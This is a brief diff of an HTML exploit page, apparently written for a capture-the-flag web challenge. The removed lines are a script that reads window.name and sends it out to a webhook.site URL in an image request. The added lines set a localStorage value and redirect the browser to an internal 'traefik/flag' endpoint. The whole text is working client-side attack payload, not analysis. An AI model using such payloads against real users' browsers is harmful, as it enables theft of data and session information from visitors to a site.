@@ -1,10 +1,4 @@
-<html>
-  <body>
-    <script>
-      const flag = window.name;
-      if (flag) {
-        new Image().src = "https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?flag=" + encodeURIComponent(flag);
-      }
-    </script>
-  </body>
-</html>
+<script>
+  localStorage.setItem('check', '1');
+  window.open("http://traefik/flag", "_self");
+</script>
